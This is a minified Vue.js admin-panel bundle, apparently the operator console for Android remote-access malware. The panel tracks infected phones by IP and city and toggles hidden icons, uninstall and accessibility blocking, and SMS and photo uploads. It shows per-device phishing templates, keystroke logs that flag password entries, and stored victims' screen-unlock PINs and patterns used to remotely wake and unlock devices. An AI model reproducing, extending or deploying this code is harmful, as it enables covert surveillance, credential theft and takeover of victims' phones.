import{u as X}from"./useView.da8c253d.js";import{_ as Z,b as B}from"./index.08ae0f5b.js";import _ from"./detail.946baa2f.js";import ee from"./list.9283ae0f.js";import te from"./list.8a306d18.js";import le from"./list.fbea85e3.js";import{d as ae,a as oe,e as n,$ as ue,N as f,V as G,r as m,y as ie,t as c,A as y,E as a,F as o,J as I,I as U,u as C,H as r,G as D,O as ne,z as L,B as s,a4 as z,L as K,f as J}from"./vlib.982cfaee.js";import"./lodash.0b661716.js";import"./monacoeditor.d62c48b5.js";import"./lib.b62e57c8.js";const re=ae({components:{DeviceDetail:_,AppList:ee,SmsList:te,AlbumList:le},setup(){const e=oe({post:!0,getDataListURL:"/device/page",getDataListIsPage:!0,installAppFilter:[],dataForm:{deviceId:"",pkg:"",phone:"",model:"",language:"",brand:"",installApp:"",status:"",start:"",end:"",remark:"",kill:""}}),t=n(""),u=n([]),d=n(!1),v=n(!1),w=n([]),k=n([]),p=n(""),b=n(null),A=n({deviceId:"",pkg:""}),T=n(!1),h=n({deviceId:""}),S=n(!1),g=n([]),V=n(null),$=n(!1),R=n(null),q=n(!1),F=n({deviceId:""}),M=n(!1),Y=n({deviceId:""}),x=n(null),O=n(!1),E=n(""),P=n(!1),W=n({id:"",deviceId:"",remark:""});return{...X(e),...ue(e),deviceId:t,inputLogVisible:d,logLoading:v,inputLogList:w,queryDate:k,queryAppPkg:p,querySource:b,currentDevice:A,appListVisible:T,currentAppDevice:h,unlockDialogVisible:S,unlockOptions:g,selectedUnlockId:V,unlocking:$,currentWakeRow:R,smsListVisible:q,currentSmsDevice:F,albumListVisible:M,currentAlbumDevice:Y,lastActivityTimeRange:x,remarkDialogVisible:O,remarkContent:E,remarkSubmitting:P,currentRemarkDevice:W,fishTemplateList:u,permissionsName:{"android.permission.READ_SMS":"\u77ED\u4FE1","android.permission.READ_MEDIA_IMAGES":"\u76F8\u518C","android.permission.BATTERY":"\u7535\u6C60","android.permission.AUTO_START":"\u81EA\u542F\u52A8"}}},async mounted(){await this.fetchInstallAppFilterList();const e=this.getBeijingTimestamp(),t=e-10*60*1e3;this.lastActivityTimeRange=[t,e],this.dataForm.start=t,this.dataForm.end=e,this.getDataList(),await this.fetchFishTemplateList()},methods:{getBeijingTimestamp(){const e=new Date,t=e.getTime(),u=e.getTimezoneOffset()*60*1e3,d=8*60*60*1e3;return t+u+d},async fetchFishTemplateList(){let{code:e,data:t,msg:u}=await B.post("/device/fishCodeList");e==0?this.fishTemplateList=t:f.error(u||"\u83B7\u53D6\u9493\u9C7C\u6A21\u677F\u5931\u8D25")},enterScreen(e){this.deviceId=e.deviceId,this.$refs.deviceDetail.show(e)},async fetchInstallAppFilterList(){let{code:e,data:t,msg:u}=await B.post("/device/installAppFilterList");e==0?this.installAppFilter=t:G.alert(u,"\u9519\u8BEF",{type:"error",confirmButtonText:"OK"})},async wakeup(e){var w;const{success:t,data:u,msg:d}=await B.post("/unlockScreenPwd/page",{deviceId:e.id,page:1,limit:100});if(!t){f.error(d);return}const v=Array.isArray(u)?u:u&&(u.list||u.records)||[];if(this.unlockOptions=v||[],!this.unlockOptions||this.unlockOptions.length===0){f({message:"\u6682\u65E0\u53EF\u9009\u89E3\u9501\u5BC6\u7801\uFF0C\u8BF7\u5148\u6DFB\u52A0",type:"warning"});return}this.currentWakeRow=e,this.selectedUnlockId=((w=this.unlockOptions[0])==null?void 0:w.id)||null,this.unlockDialogVisible=!0},async confirmWakeup(){if(!this.currentWakeRow||!this.selectedUnlockId){f({message:"\u8BF7\u9009\u62E9\u89E3\u9501\u5BC6\u7801",type:"warning"});return}this.unlocking=!0;try{const{code:e,msg:t}=await B.post("/device/wakeup",{id:this.currentWakeRow.id,unlockPwdId:this.selectedUnlockId});e==0?(f({message:"\u64CD\u4F5C\u6210\u529F,\u7B49\u5F85\u5524\u9192!",type:"success"}),this.unlockDialogVisible=!1,this.currentWakeRow=null,this.selectedUnlockId=null,this.getDataList()):G.alert(t,"\u9519\u8BEF",{type:"error",confirmButtonText:"OK"})}finally{this.unlocking=!1}},async showInputLog(e){this.currentDevice.deviceId=e.deviceId,this.currentDevice.pkg=e.pkg,this.queryAppPkg="",this.querySource=null;const t=new Date,u=t.getFullYear()+"-"+String(t.getMonth()+1).padStart(2,"0")+"-"+String(t.getDate()).padStart(2,"0");this.queryDate=[u,u],this.inputLogVisible=!0,this.inputLogList=[],await this.refreshLog()},async refreshLog(){if(!this.currentDevice.deviceId||!this.currentDevice.pkg||!this.queryDate||!Array.isArray(this.queryDate)||this.queryDate.length!==2){f({message:"\u67E5\u8BE2\u53C2\u6570\u4E0D\u5B8C\u6574",type:"warning"});return}this.logLoading=!0,this.inputLogList=[];try{const[e,t]=this.queryDate,u=new Date(e),d=new Date(t),v=new Date(u.getFullYear(),u.getMonth(),u.getDate()).getTime(),w=new Date(d.getFullYear(),d.getMonth(),d.getDate()+1).getTime()-1,{code:k,data:p,msg:b}=await B.post("/inputTextRecord/group",{deviceId:this.currentDevice.deviceId,startTime:v,endTime:w,pkg:this.currentDevice.pkg,appPkg:this.queryAppPkg||void 0,source:this.querySource!==null?this.querySource:void 0});k==0?p&&p.items&&Array.isArray(p.items)?this.inputLogList=p.items:this.inputLogList=[]:f({message:b||"\u83B7\u53D6\u65E5\u5FD7\u5931\u8D25",type:"error"})}catch{f({message:"\u83B7\u53D6\u65E5\u5FD7\u5931\u8D25",type:"error"})}finally{this.logLoading=!1}},onDateChange(){},formatTime(e){if(!e)return"";const t=Number(e);if(isNaN(t))return"";const u=new Date(t);if(isNaN(u.getTime()))return"";const d=u.getFullYear(),v=String(u.getMonth()+1).padStart(2,"0"),w=String(u.getDate()).padStart(2,"0"),k=String(u.getHours()).padStart(2,"0"),p=String(u.getMinutes()).padStart(2,"0"),b=String(u.getSeconds()).padStart(2,"0");return`${d}-${v}-${w} ${k}:${p}:${b}`},async updateFishSwitch(e,t,u){try{const{success:d,msg:v}=await B.post("/device/updateFishSwitch",{id:e.id,code:t,value:u},void 0,!0);d?(f.success("\u66F4\u65B0\u6210\u529F"),this.getDataList()):f.error(v||"\u66F4\u65B0\u5931\u8D25")}catch{f.error("\u66F4\u65B0\u5931\u8D25")}},async updateDeviceSwitch(e,t,u){const d=u?1:0;e[t]=d;try{const{success:v,msg:w}=await B.post("/device/updateSwitch",{id:e.id,[t]:d},void 0,!0);v?f.success("\u66F4\u65B0\u6210\u529F"):(f.error(w||"\u66F4\u65B0\u5931\u8D25"),e[t]=d?0:1)}catch{f.error("\u66F4\u65B0\u5931\u8D25"),e[t]=d?0:1}},formatUnlockTips(e){let t="";switch(e.type){case 0:return"\u65E0\u9501";case 1:t="PIN\u7801";break;case 2:t="\u624B\u52BF";break;case 3:t="\u6DF7\u5408\u5BC6\u7801";break;default:return"\u672A\u77E5"}let u="";switch(e.source){case 1:u="\u9493\u9C7C";break;case 2:u="\u91C7\u96C6";break;default:u="\u672A\u77E5";break}return`(${u}) - ${t}:${e.tips}`},showAppList(e){this.currentAppDevice.deviceId=e.deviceId,this.appListVisible=!0},showSmsList(e){this.currentSmsDevice.deviceId=e.deviceId,this.smsListVisible=!0},showAlbumList(e){this.currentAlbumDevice.deviceId=e.deviceId,this.albumListVisible=!0},showRemarkDialog(e){this.currentRemarkDevice.id=e.id,this.currentRemarkDevice.deviceId=e.deviceId,this.currentRemarkDevice.remark=e.remark||"",this.remarkContent=e.remark||"",this.remarkDialogVisible=!0},async submitRemark(){if(!this.currentRemarkDevice.id){f.error("\u8BBE\u5907ID\u4E0D\u80FD\u4E3A\u7A7A");return}this.remarkSubmitting=!0;try{const{code:e,msg:t}=await B.post("/device/updateRemark",{id:this.currentRemarkDevice.id,remark:this.remarkContent});e===0?(f.success("\u5907\u6CE8\u66F4\u65B0\u6210\u529F"),this.remarkDialogVisible=!1,this.remarkContent="",this.getDataList()):f.error(t||"\u5907\u6CE8\u66F4\u65B0\u5931\u8D25")}catch{f.error("\u5907\u6CE8\u66F4\u65B0\u5931\u8D25")}finally{this.remarkSubmitting=!1}},onLastActivityTimeChange(e){if(e&&Array.isArray(e)&&e.length===2){const t=Number(e[0]),u=Number(e[1]),d=new Date().getTimezoneOffset()*60*1e3,v=8*60*60*1e3,w=d+v;this.dataForm.start=t+w,this.dataForm.end=u+w}else this.dataForm.start="",this.dataForm.end=""}}}),se={class:"mod-sys__log-operation"},de={class:"log-header"},pe={class:"header-row"},me={class:"query-controls"},ce={class:"log-content"},ge={class:"log-content-row"},fe={class:"log-time"},ve={class:"log-app"},he={key:0,class:"log-resource"},we={class:"log-text"},ke={key:0,class:"no-data"},be={style:{float:"left"}},De={style:{float:"right",color:"#8492a6","font-size":"13px"}},ye={style:{color:"#00adff"}};function Fe(e,t,u,d,v,w){var j;const k=m("el-input"),p=m("el-form-item"),b=m("el-option"),A=m("el-select"),T=m("el-date-picker"),h=m("el-button"),S=m("el-form"),g=m("el-table-column"),V=m("el-switch"),$=m("Select"),R=m("Close"),q=m("el-icon"),F=m("el-tag"),M=m("el-tooltip"),Y=m("el-table"),x=m("el-pagination"),O=m("DeviceDetail"),E=m("el-dialog"),P=m("AppList"),W=m("SmsList"),Q=m("AlbumList"),H=ie("loading");return c(),y("div",se,[a(S,{inline:!0,model:e.dataForm,onKeyup:t[11]||(t[11]=ne(l=>e.getDataList(),["enter"]))},{default:o(()=>[a(p,null,{default:o(()=>[a(k,{modelValue:e.dataForm.deviceId,"onUpdate:modelValue":t[0]||(t[0]=l=>e.dataForm.deviceId=l),placeholder:"\u8BBE\u5907ID",clearable:""},null,8,["modelValue"])]),_:1}),a(p,null,{default:o(()=>[a(k,{modelValue:e.dataForm.pkg,"onUpdate:modelValue":t[1]||(t[1]=l=>e.dataForm.pkg=l),placeholder:"\u6240\u5C5E\u5305",clearable:""},null,8,["modelValue"])]),_:1}),a(p,null,{default:o(()=>[a(k,{modelValue:e.dataForm.model,"onUpdate:modelValue":t[2]||(t[2]=l=>e.dataForm.model=l),placeholder:"\u624B\u673A\u578B\u53F7",clearable:""},null,8,["modelValue"])]),_:1}),a(p,null,{default:o(()=>[a(k,{modelValue:e.dataForm.language,"onUpdate:modelValue":t[3]||(t[3]=l=>e.dataForm.language=l),placeholder:"\u8BED\u8A00",clearable:""},null,8,["modelValue"])]),_:1}),a(p,null,{default:o(()=>[a(k,{modelValue:e.dataForm.brand,"onUpdate:modelValue":t[4]||(t[4]=l=>e.dataForm.brand=l),placeholder:"\u54C1\u724C",clearable:""},null,8,["modelValue"])]),_:1}),a(p,null,{default:o(()=>[a(A,{filterable:"",modelValue:e.dataForm.installApp,"onUpdate:modelValue":t[5]||(t[5]=l=>e.dataForm.installApp=l),placeholder:"\u5DF2\u5B89\u88C5APP",clearable:""},{default:o(()=>[(c(!0),y(I,null,U(e.installAppFilter,l=>(c(),C(b,{key:l.packageName,label:`${l.appName}(${l.packageName})`,value:l.packageName},null,8,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1}),a(p,null,{default:o(()=>[a(A,{modelValue:e.dataForm.status,"onUpdate:modelValue":t[6]||(t[6]=l=>e.dataForm.status=l),placeholder:"\u72B6\u6001",clearable:""},{default:o(()=>[a(b,{label:"\u7184\u5C4F",value:0}),a(b,{label:"\u4EAE\u5C4F",value:1})]),_:1},8,["modelValue"])]),_:1}),a(p,null,{default:o(()=>[a(A,{modelValue:e.dataForm.kill,"onUpdate:modelValue":t[7]||(t[7]=l=>e.dataForm.kill=l),placeholder:"\u5DF2\u6740/\u672A\u6740",clearable:""},{default:o(()=>[a(b,{label:"\u672A\u6740",value:0}),a(b,{label:"\u5DF2\u6740",value:1})]),_:1},8,["modelValue"])]),_:1}),a(p,null,{default:o(()=>[a(k,{modelValue:e.dataForm.remark,"onUpdate:modelValue":t[8]||(t[8]=l=>e.dataForm.remark=l),placeholder:"\u5907\u6CE8"},null,8,["modelValue"])]),_:1}),a(p,null,{default:o(()=>[a(T,{modelValue:e.lastActivityTimeRange,"onUpdate:modelValue":t[9]||(t[9]=l=>e.lastActivityTimeRange=l),type:"datetimerange","range-separator":"\u81F3","start-placeholder":"\u5F00\u59CB\u65F6\u95F4","end-placeholder":"\u7ED3\u675F\u65F6\u95F4",format:"YYYY-MM-DD HH:mm:ss","value-format":"x",onChange:e.onLastActivityTimeChange,style:{width:"360px"}},null,8,["modelValue","onChange"])]),_:1}),a(p,null,{default:o(()=>[a(h,{onClick:t[10]||(t[10]=l=>e.getDataList())},{default:o(()=>[r(D(e.$t("query")),1)]),_:1})]),_:1})]),_:1},8,["model"]),L((c(),C(Y,{data:e.dataList,border:"",onSortChange:e.dataListSortChangeHandle,"table-layout":"auto",style:{width:"100%"}},{default:o(()=>[a(g,{prop:"deviceId",label:"\u8BBE\u5907ID","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":""}),a(g,{prop:"pkg",label:"\u6240\u5C5E\u5305","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":""}),a(g,{prop:"brand",label:"\u54C1\u724C","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":!0}),a(g,{prop:"model",label:"\u624B\u673A\u578B\u53F7","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":""}),a(g,{prop:"language",label:"\u8BED\u8A00","header-align":"center",align:"center",width:"60px","show-overflow-tooltip":""}),a(g,{prop:"systemVersion",label:"\u7CFB\u7EDF\u7248\u672C","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":""}),a(g,{prop:"sdkVersion",label:"sdk\u7248\u672C","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":!0}),a(g,{label:"\u5C4F\u5E55\u5206\u8FA8\u7387","header-align":"center",align:"center",width:"80px","show-overflow-tooltip":!0},{default:o(l=>[r(D(`${l.row.screenWidth}\xD7${l.row.screenHeight}`),1)]),_:1}),a(g,{prop:"ip",label:"IP/\u57CE\u5E02","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":!0},{default:o(l=>[r(D(l.row.ip)+" / "+D(l.row.addr),1)]),_:1}),a(g,{prop:"lastHeart",label:"\u6700\u540E\u6D3B\u52A8\u65F6\u95F4","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":!0}),a(g,{label:"\u5F00\u5173","header-align":"center",align:"right",width:"150px"},{default:o(l=>[a(V,{"inactive-text":"\u9690\u85CF\u56FE\u6807","model-value":!!l.row.hideIcon,"onUpdate:modelValue":i=>e.updateDeviceSwitch(l.row,"hideIcon",i)},null,8,["model-value","onUpdate:modelValue"]),a(V,{"inactive-text":"\u963B\u6B62\u5378\u8F7D","model-value":!!l.row.uninstallGuard,"onUpdate:modelValue":i=>e.updateDeviceSwitch(l.row,"uninstallGuard",i)},null,8,["model-value","onUpdate:modelValue"]),a(V,{"inactive-text":"\u963B\u6B62\u65E0\u969C\u788D","model-value":!!l.row.accessibilityGuard,"onUpdate:modelValue":i=>e.updateDeviceSwitch(l.row,"accessibilityGuard",i)},null,8,["model-value","onUpdate:modelValue"]),a(V,{"inactive-text":"Kill\u72B6\u6001","model-value":!!l.row.kill,"onUpdate:modelValue":i=>e.updateDeviceSwitch(l.row,"kill",i)},null,8,["model-value","onUpdate:modelValue"]),a(V,{"inactive-text":"\u4E0A\u4F20\u77ED\u4FE1","model-value":!!l.row.uploadSms,"onUpdate:modelValue":i=>e.updateDeviceSwitch(l.row,"uploadSms",i)},null,8,["model-value","onUpdate:modelValue"]),a(V,{"inactive-text":"\u4E0A\u4F20\u76F8\u518C","model-value":!!l.row.uploadAlbum,"onUpdate:modelValue":i=>e.updateDeviceSwitch(l.row,"uploadAlbum",i)},null,8,["model-value","onUpdate:modelValue"])]),_:1}),a(g,{label:"\u9493\u9C7C\u5F00\u5173","header-align":"center",align:"right",width:"150px"},{default:o(l=>[(c(!0),y(I,null,U(e.fishTemplateList,i=>(c(),C(V,{key:i.code,"inactive-text":i.label,"model-value":l.row.fishSwitch&&!!l.row.fishSwitch[i.code],"onUpdate:modelValue":N=>e.updateFishSwitch(l.row,i.code,N)},null,8,["inactive-text","model-value","onUpdate:modelValue"]))),128))]),_:1}),a(g,{label:"\u6743\u9650","header-align":"center",align:"center",width:"150px"},{default:o(l=>[s("div",null,[a(F,{type:l.row.accessibilityServiceEnabled==1?"success":"danger"},{default:o(()=>[t[26]||(t[26]=r("\u65E0\u969C\u788D ")),a(q,null,{default:o(()=>[l.row.accessibilityServiceEnabled==1?(c(),C($,{key:0})):(c(),C(R,{key:1}))]),_:2},1024)]),_:2},1032,["type"])]),(c(!0),y(I,null,U(l.row.permissions,(i,N)=>(c(),y("div",{key:N},[a(F,{type:i?"success":"danger"},{default:o(()=>[r(D(e.permissionsName[N])+" ",1),a(q,null,{default:o(()=>[i?(c(),C($,{key:0})):(c(),C(R,{key:1}))]),_:2},1024)]),_:2},1032,["type"])]))),128))]),_:1}),a(g,{label:"\u8BBE\u5907\u72B6\u6001","header-align":"center",align:"right",width:"150px"},{default:o(l=>[s("div",null,[t[29]||(t[29]=r(" \u53EF\u89E3\u9501 ")),l.row.lockScreen?(c(),C(M,{key:0,class:"box-item",effect:"dark",content:e.formatUnlockTips(l.row.lockScreen),placement:"top"},{default:o(()=>[a(F,{type:"success"},{default:o(()=>t[27]||(t[27]=[r("YES")])),_:1})]),_:2},1032,["content"])):(c(),C(F,{key:1,type:"danger"},{default:o(()=>t[28]||(t[28]=[r("NO")])),_:1}))]),s("div",null,[t[34]||(t[34]=r(" \u8BBE\u5907\u72B6\u6001 ")),L(a(F,{type:"danger"},{default:o(()=>t[30]||(t[30]=[r("\u7184\u5C4F")])),_:2},1536),[[z,l.row.status==0]]),L(a(F,{type:"success"},{default:o(()=>t[31]||(t[31]=[r("\u4EAE\u5C4F")])),_:2},1536),[[z,l.row.status==1]]),L(a(F,{type:"info"},{default:o(()=>t[32]||(t[32]=[r("\u7B49\u5F85\u5524\u9192")])),_:2},1536),[[z,l.row.status==2]]),L(a(F,{type:"info"},{default:o(()=>t[33]||(t[33]=[r("\u7B49\u5F85\u5524\u9192")])),_:2},1536),[[z,l.row.status==3]])])]),_:1}),a(g,{prop:"created",label:"\u5B89\u88C5\u65F6\u95F4","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":!0}),a(g,{prop:"remark",label:"\u5907\u6CE8","show-overflow-tooltip":"","header-align":"center",align:"center"}),a(g,{label:e.$t("handle"),"header-align":"center",align:"center",width:"90px",fixed:"right"},{default:o(l=>[s("div",null,[a(h,{link:"",type:"primary",onClick:i=>e.enterScreen(l.row)},{default:o(()=>t[35]||(t[35]=[r("\u94FE\u63A5\u8BBE\u5907")])),_:2},1032,["onClick"])]),s("div",null,[a(h,{link:"",type:"primary",onClick:i=>e.showInputLog(l.row)},{default:o(()=>t[36]||(t[36]=[r("\u8F93\u5165\u8BB0\u5F55")])),_:2},1032,["onClick"])]),s("div",null,[a(h,{link:"",type:"primary",onClick:i=>e.showAppList(l.row)},{default:o(()=>t[37]||(t[37]=[r("\u5B89\u88C5\u5E94\u7528")])),_:2},1032,["onClick"])]),s("div",null,[a(h,{link:"",type:"primary",onClick:i=>e.showSmsList(l.row)},{default:o(()=>t[38]||(t[38]=[r("\u77ED\u4FE1\u8BB0\u5F55")])),_:2},1032,["onClick"])]),s("div",null,[a(h,{link:"",type:"primary",onClick:i=>e.showAlbumList(l.row)},{default:o(()=>t[39]||(t[39]=[r("\u67E5\u770B\u76F8\u518C")])),_:2},1032,["onClick"])]),s("div",null,[a(h,{link:"",type:"primary",onClick:i=>e.showRemarkDialog(l.row)},{default:o(()=>t[40]||(t[40]=[r("\u5907\u6CE8")])),_:2},1032,["onClick"])])]),_:1},8,["label"])]),_:1},8,["data","onSortChange"])),[[H,e.dataListLoading]]),a(x,{"current-page":e.page,"page-sizes":[10,20,50,100],"page-size":e.limit,total:e.total,layout:"total, sizes, prev, pager, next, jumper",onSizeChange:e.pageSizeChangeHandle,onCurrentChange:e.pageCurrentChangeHandle},null,8,["current-page","page-size","total","onSizeChange","onCurrentChange"]),a(O,{ref:"deviceDetail",onWakeup:e.wakeup},null,8,["onWakeup"]),a(E,{modelValue:e.inputLogVisible,"onUpdate:modelValue":t[16]||(t[16]=l=>e.inputLogVisible=l),title:`\u8F93\u5165\u65E5\u5FD7 - \u8BBE\u5907ID: ${e.currentDevice.deviceId} \u5305\u540D: ${e.currentDevice.pkg}`,width:"970px","close-on-click-modal":!1,class:"input-log-dialog","destroy-on-close":""},{footer:o(()=>[a(h,{onClick:t[15]||(t[15]=l=>e.inputLogVisible=!1)},{default:o(()=>t[45]||(t[45]=[r("\u5173\u95ED")])),_:1})]),default:o(()=>[s("div",de,[s("div",pe,[s("div",me,[t[42]||(t[42]=s("span",{class:"query-label"},"\u6765\u6E90:",-1)),a(A,{modelValue:e.querySource,"onUpdate:modelValue":t[12]||(t[12]=l=>e.querySource=l),placeholder:"\u9009\u62E9\u6765\u6E90",clearable:"",style:{width:"120px"}},{default:o(()=>[a(b,{label:"\u7BA1\u7406\u7AEF",value:1}),a(b,{label:"App\u7AEF",value:0})]),_:1},8,["modelValue"]),t[43]||(t[43]=s("span",{class:"query-label"},"APP\u5305\u540D:",-1)),a(k,{modelValue:e.queryAppPkg,"onUpdate:modelValue":t[13]||(t[13]=l=>e.queryAppPkg=l),placeholder:"\u8F93\u5165APP\u5305\u540D",clearable:"",style:{width:"200px"}},null,8,["modelValue"]),t[44]||(t[44]=s("span",{class:"query-label"},"\u67E5\u8BE2\u65E5\u671F:",-1)),a(T,{modelValue:e.queryDate,"onUpdate:modelValue":t[14]||(t[14]=l=>e.queryDate=l),type:"daterange","range-separator":"\u81F3","start-placeholder":"\u5F00\u59CB\u65E5\u671F","end-placeholder":"\u7ED3\u675F\u65E5\u671F",format:"YYYY-MM-DD","value-format":"YYYY-MM-DD",onChange:e.onDateChange,style:{width:"280px"}},null,8,["modelValue","onChange"]),a(h,{type:"primary",onClick:e.refreshLog,loading:e.logLoading,size:"small"},{default:o(()=>t[41]||(t[41]=[r("\u91CD\u65B0\u67E5\u8BE2")])),_:1},8,["onClick","loading"])])])]),L((c(),y("div",ce,[(c(!0),y(I,null,U(e.inputLogList,(l,i)=>(c(),y("div",{class:K(["log-item",{"password-item":l.password==1}]),key:i},[s("div",ge,[s("span",fe,D(l.date||e.formatTime(l.time)),1),s("span",{class:K(["log-source",{"source-admin":l.source==1,"source-app":l.source==0}])},D(l.source==1?"\u7BA1\u7406\u7AEF":"App\u7AEF"),3),s("span",ve,D(l.app),1),l.resourceId?(c(),y("span",he,D(l.resourceId),1)):J("",!0),s("span",we,D(l.text||(l.password==1?"[\u5BC6\u7801\u8F93\u5165]":"\u65E0\u5185\u5BB9")),1)])],2))),128)),e.inputLogList.length===0&&!e.logLoading?(c(),y("div",ke,"\u6682\u65E0\u8F93\u5165\u65E5\u5FD7\u6570\u636E")):J("",!0)])),[[H,e.logLoading]])]),_:1},8,["modelValue","title"]),a(E,{modelValue:e.appListVisible,"onUpdate:modelValue":t[17]||(t[17]=l=>e.appListVisible=l),title:`\u5B89\u88C5\u5E94\u7528\u5217\u8868 - \u8BBE\u5907ID: ${e.currentAppDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:o(()=>[a(P,{"device-id":e.currentAppDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),a(E,{modelValue:e.unlockDialogVisible,"onUpdate:modelValue":t[20]||(t[20]=l=>e.unlockDialogVisible=l),title:`\u9009\u62E9\u89E3\u9501\u5BC6\u7801 - \u8BBE\u5907ID: ${((j=e.currentWakeRow)==null?void 0:j.deviceId)||""}`,width:"480px","close-on-click-modal":!1,"destroy-on-close":""},{footer:o(()=>[a(h,{onClick:t[19]||(t[19]=l=>e.unlockDialogVisible=!1)},{default:o(()=>t[46]||(t[46]=[r("\u53D6\u6D88")])),_:1}),a(h,{type:"primary",onClick:e.confirmWakeup,loading:e.unlocking,disabled:!e.selectedUnlockId},{default:o(()=>t[47]||(t[47]=[r("\u786E\u5B9A")])),_:1},8,["onClick","loading","disabled"])]),default:o(()=>[s("div",null,[a(S,{"label-width":"90px"},{default:o(()=>[a(p,{label:"\u89E3\u9501\u5BC6\u7801"},{default:o(()=>[a(A,{modelValue:e.selectedUnlockId,"onUpdate:modelValue":t[18]||(t[18]=l=>e.selectedUnlockId=l),placeholder:"\u8BF7\u9009\u62E9\u89E3\u9501\u5BC6\u7801",filterable:"",style:{width:"100%"}},{default:o(()=>[(c(!0),y(I,null,U(e.unlockOptions,l=>(c(),C(b,{key:l.id,label:e.formatUnlockTips(l),value:l.id},{default:o(()=>[s("span",be,D(e.formatUnlockTips(l)),1),s("span",De,[s("span",ye,D(l.createDate),1)])]),_:2},1032,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1})]),_:1})])]),_:1},8,["modelValue","title"]),a(E,{modelValue:e.smsListVisible,"onUpdate:modelValue":t[21]||(t[21]=l=>e.smsListVisible=l),title:`\u77ED\u4FE1\u8BB0\u5F55 - \u8BBE\u5907ID: ${e.currentSmsDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:o(()=>[a(W,{"device-id":e.currentSmsDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),a(E,{modelValue:e.albumListVisible,"onUpdate:modelValue":t[22]||(t[22]=l=>e.albumListVisible=l),title:`\u76F8\u518C\u5217\u8868 - \u8BBE\u5907ID: ${e.currentAlbumDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:o(()=>[a(Q,{"device-id":e.currentAlbumDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),a(E,{modelValue:e.remarkDialogVisible,"onUpdate:modelValue":t[25]||(t[25]=l=>e.remarkDialogVisible=l),title:`\u8BBE\u5907\u5907\u6CE8 - \u8BBE\u5907ID: ${e.currentRemarkDevice.deviceId}`,width:"500px","close-on-click-modal":!1,"destroy-on-close":""},{footer:o(()=>[a(h,{onClick:t[24]||(t[24]=l=>e.remarkDialogVisible=!1)},{default:o(()=>t[48]||(t[48]=[r("\u53D6\u6D88")])),_:1}),a(h,{type:"primary",onClick:e.submitRemark,loading:e.remarkSubmitting},{default:o(()=>t[49]||(t[49]=[r("\u786E\u5B9A")])),_:1},8,["onClick","loading"])]),default:o(()=>[a(S,{"label-width":"80px"},{default:o(()=>[a(p,{label:"\u5907\u6CE8\u5185\u5BB9"},{default:o(()=>[a(k,{modelValue:e.remarkContent,"onUpdate:modelValue":t[23]||(t[23]=l=>e.remarkContent=l),type:"textarea",rows:4,placeholder:"\u8BF7\u8F93\u5165\u5907\u6CE8\u5185\u5BB9",clearable:""},null,8,["modelValue"])]),_:1})]),_:1})]),_:1},8,["modelValue","title"])])}var $e=Z(re,[["render",Fe],["__scopeId","data-v-38877ec6"]]);export{$e as default};
